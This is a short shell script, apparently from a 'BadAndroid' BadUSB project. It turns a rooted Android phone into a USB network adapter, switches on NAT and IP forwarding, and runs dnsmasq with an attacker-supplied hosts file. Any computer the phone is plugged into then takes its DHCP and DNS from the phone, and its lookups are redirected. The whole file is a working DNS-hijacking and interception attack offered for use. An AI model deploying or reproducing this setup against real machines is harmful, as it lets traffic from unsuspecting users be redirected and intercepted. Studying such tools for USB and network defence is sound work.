#!/bin/sh

echo "[*] Enabling BADUSB functionality"

TMPDIR=/opt/badandroid
UPSTREAM_NS=8.8.8.8
INTERFACE=rndis0

# Check required tools
if ! test -e /sys/class/android_usb/android0/f_rndis;then
    echo "Device doesn't support RNDIS"
    exit 1
fi
if ! test -e /opt/badandroid/hosts;then
    echo "Please add a hosts file for your redirects to /opt/badandroid/tmp/hosts"
    exit 1
fi

echo "Disabling usb interface before reconfiguring..."
# We have to disable the usb interface before reconfiguring it
echo 0 > /sys/devices/virtual/android_usb/android0/enable
echo rndis > /sys/devices/virtual/android_usb/android0/functions
echo 224 > /sys/devices/virtual/android_usb/android0/bDeviceClass
echo 6863 > /sys/devices/virtual/android_usb/android0/idProduct
echo 1 > /sys/devices/virtual/android_usb/android0/enable

# Check whether it has applied the changes
ifconfig rndis0 up

# Wait until the interface actually exists
while ! ifconfig rndis0 > /dev/null 2>&1;do
    echo Waiting for interface rndis0
    sleep 1
done

# Configure interface, firewall and packet forwarding
echo "Bringing rndis0 up and setting iptables"

ifconfig rndis0 inet 10.0.0.1 netmask 255.255.255.0 up

#iptables -t nat -F
#iptables -F

iptables -I FORWARD -i rndis0 -j ACCEPT
iptables -t nat -A POSTROUTING -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward

chmod 644 /opt/badandroid/hosts
# Start dnsmasq
dnsmasq -H /opt/badandroid/hosts -i rndis0 -R -S 8.8.8.8 -F 10.0.0.100,10.0.0.200 -x $TMPDIR/dnsmasq.pid
